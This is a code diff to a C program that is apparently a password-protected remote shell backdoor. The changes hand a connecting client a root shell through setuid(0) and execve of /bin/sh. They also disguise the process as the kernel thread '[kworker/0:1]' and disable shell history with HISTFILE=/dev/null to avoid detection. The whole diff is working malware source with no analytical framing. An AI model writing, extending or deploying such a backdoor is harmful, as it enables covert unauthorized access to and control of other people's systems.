@@ -72,7 +72,8 @@ void fuck(int client_sock)
 	FILE *fp;
 	char path[256];
 	char *pass = "knock knock m0therfucker";
-
+	
+	setsid();
 	dup2(client_sock, STDIN_FILENO);
 	dup2(client_sock, STDOUT_FILENO);
 	dup2(client_sock, STDERR_FILENO);
@@ -88,20 +89,13 @@ void fuck(int client_sock)
 		}
 
 		if (auth == 666) {
-			char *boffer = strcat(client_message, " 2>&1");
-			strtok(boffer, "\n");
-
-			fp = popen(boffer, "r");
-
-			if (fp == NULL) {
-				perror("null fp");
-				exit(1);
-			}
-			else {
-				while (fgets(path, sizeof(path), fp) != NULL){
-					printf("%s", path);
-			}
-		}
+			setuid(0);
+			setgid(0);
+			char const *args[] = { "[kworker/0:1]", "-i", NULL };
+			char const *env[]  = { "HISTFILE=/dev/null", "SAVEHIST=",
+			                       "PS1=\n[$(whoami)@$(hostname)]:$(pwd)\\$ ",
+			                       "LANG=en_US.UTF-8", NULL };
+			execve("/bin/sh", args, env);
 		}
 	}
 	if(read_size == 0)
@@ -114,6 +108,8 @@ void fuck(int client_sock)
 		perror("recv failed");
 		exit(1);
 	}
+	printf("closing client sock: %d: bye bye", client_sock);
+	close(client_sock);
 	exit(0);
 }
 
@@ -155,6 +151,7 @@ int main(int argc , char *argv[])
 		else{
 			int status;
 			printf("main(): had a baby called: pid %d\n", pid);
+			//close(client_sock);
 /*			
 			(void)waitpid(pid, &status, 0);
 			printf("main(): child’s status: is %d\n", status);
